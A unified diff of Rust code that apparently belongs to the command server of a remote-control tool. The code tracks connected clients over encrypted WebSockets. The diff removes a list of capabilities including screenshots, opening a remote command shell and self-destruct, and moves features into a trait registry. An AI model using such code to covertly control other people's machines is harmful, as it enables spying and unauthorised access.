@@ -1,30 +1,23 @@
 use core::str;
 use std::net::{IpAddr, SocketAddr};
 
-use aes_gcm::{aead::Aead, Aes256Gcm, KeyInit, Nonce};
 use futures_util::{
+    future::Lazy,
     stream::{SplitSink, SplitStream},
     SinkExt, StreamExt,
 };
-use rand::{rngs::OsRng, RngCore};
 use rsa::{
     pkcs1::{DecodeRsaPublicKey, EncodeRsaPrivateKey, EncodeRsaPublicKey},
-    Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey,
+    RsaPrivateKey, RsaPublicKey,
 };
 use tokio_tungstenite::WebSocketStream;
 use tungstenite::Message;
 
+use super::{
+    feature::{self, update::Update, Feature},
+    hybrid_encryption::{encrypt_data, HybridEncryptionResult},
+};
 use crate::connector_server::hybrid_encryption::{encrypt_data_combined, generate_private_key};
-
-use super::hybrid_encryption::{encrypt_data, HybridEncryptionResult};
-
-pub const FEATURES: [&str; 5] = [
-    "update",
-    "start_file_transfer",
-    "send_screenshot",
-    "open_cmd",
-    "self_destruct",
-];
 #[derive(Debug)]
 #[allow(dead_code)]
 pub struct Instance {
@@ -35,6 +28,7 @@ pub struct Instance {
     public_key: Option<RsaPublicKey>,
     private_key: Option<RsaPrivateKey>,
     path: String,
+    features: Vec<Box<dyn Feature>>,
 }
 impl Instance {
     pub fn new(
@@ -52,6 +46,7 @@ impl Instance {
             public_key: None,
             private_key: None,
             path,
+            features: vec![Box::new(Update::new())],
         }
     }
     pub fn init_old(
@@ -71,6 +66,7 @@ impl Instance {
             public_key,
             private_key,
             path,
+            features: vec![Box::new(Update::new())],
         }
     }
     pub fn get_ip(&self) -> IpAddr {
@@ -90,6 +86,16 @@ impl Instance {
     }
     pub async fn send_message(&mut self, message: &str) {
         self.write.send(Message::from(message)).await.unwrap();
+    }
+    pub fn get_features(&self) -> &Vec<Box<dyn Feature>> {
+        &self.features
+    }
+    pub fn get_feature_by_name(&self, feature_name: String) -> &dyn Feature {
+        self.features
+            .iter()
+            .find(|feature| feature.get_name() == feature_name)
+            .map(|b| b.as_ref())
+            .unwrap()
     }
     pub async fn send_encrypted_message(&mut self, message: &str) {
         let hybrid_encryption_result = encrypt_data_combined(
